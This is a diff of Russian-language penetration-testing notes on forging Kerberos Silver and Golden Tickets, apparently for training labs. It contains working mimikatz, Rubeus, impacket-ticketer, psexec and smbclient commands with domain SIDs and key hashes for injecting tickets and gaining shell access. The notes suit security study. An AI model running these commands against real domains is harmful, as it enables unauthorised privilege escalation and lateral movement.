@@ -55,17 +55,21 @@ kerberos::golden
 1.2) Выпуск Silver Ticket
 ```powershell
 kerberos::golden 
-/user:idyachkov 
-/domain:testlab.esc 
-/sid:S-1-5-21-1129291328-2819992169-918366777 
-/target:DC01.testlab.esc 
-/service:CIFS 
-/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
+/user:idyachkov # Обязательно
+/domain:testlab.esc # Обязательно
+/sid:S-1-5-21-1129291328-2819992169-918366777 # Обязательно
+/target:DC01.testlab.esc # От какой машине мы хотим получить доступ к сервису
+/service:CIFS # Под какой сервис выпускаем TGS
+/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc # Или RC4
+/rc4:ff955e93a130f5bb1a6565f32b7dc127 # Или AES
+/ptt # Инжект сразу в сессию
+
+/ticket:idyachkov_silver.kirbi # без /ptt, если хотим использовать для создания жертвенного процесса
+
 /id:1110 # Не обязательно
-/groups:513 
-/ticket:idyachkov_silver.kirbi
-/endin:600 # общее время жизни (мин)
-/renewmax:10080 # срок, когда билет нужно продлевать (мин)
+/groups:513 # Не обязательно
+/endin:600 # общее время жизни (мин) Не обязательно
+/renewmax:10080 # срок, когда билет нужно продлевать (мин) # Не обязательно
 ```
 
  Популярные службы для Silver Tickets
@@ -89,6 +93,43 @@ Enter-PSSession dc01
 ```
 
 
+### Создание Жертвенного процесса
+
+1) Выпуск Silver Ticket
+```powershell
+kerberos::golden 
+/user:idyachkov # Обязательно
+/domain:testlab.esc # Обязательно
+/sid:S-1-5-21-1129291328-2819992169-918366777 # Обязательно
+/target:DC01.testlab.esc # От какой машине мы хотим получить доступ к сервису
+/service:CIFS # Под какой сервис выпускаем TGS
+/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc # Или RC4
+/rc4:ff955e93a130f5bb1a6565f32b7dc127 # Или AES
+/ticket:idyachkov_silver.kirbi # без /ptt, если хотим использовать для создания жертвенного процесса
+
+/id:1110 # Не обязательно
+/groups:513 # Не обязательно
+/endin:600 # общее время жизни (мин) Не обязательно
+/renewmax:10080 # срок, когда билет нужно продлевать (мин) # Не обязательно
+```
+
+2) Создание нового процесса
+```powershell
+Rubeus.exe createnetonly /program:cmd.exe /show
+```
+Поскольку он не обладает никакими привилегиями и правами, импортируем в его сессию билет
+
+3) Импорт билета
+```powershell
+Rubeus.exe ptt /ticket:sql01.kirbi
+```
+
+4) Использование нового процесса для запуска PSExec.exe 
+```powershell
+PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
+```
+
+
 ## Атака через Linux
 
 1) Определение SID домена
@@ -97,7 +138,7 @@ lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
 ```
 
 
-2) Выпуск Golden Ticket
+2.2) Выпуск Golden Ticket
 ```bash
 sudo impacket-ticketer \
 -nthash <krbtgt_hash>  \
@@ -106,10 +147,24 @@ sudo impacket-ticketer \
 Administrator
 ```
 
+2.1) Выпуск Silver Ticket
+```bash
+sudo impacket-ticketer \
+-nthash <krbtgt_hash>  \
+-domain <domain> \ 
+-domain-sid <sid>  \
+-spn cifs/sql01.inlanefreight.local \ # Доп поле
+Administrator
+```
+
 3) Инжектирование билета и получение доступа к хосту
 ```bash
 export KRB5CCNAME=./Administrator.ccache
+
+
 psexec.py -k -no-pass dc01.inlanefreight.local
+# Или
+smbclient.py -k -no-pass sql01.inlanefreight.local
 ```
 
 ## Detect attack
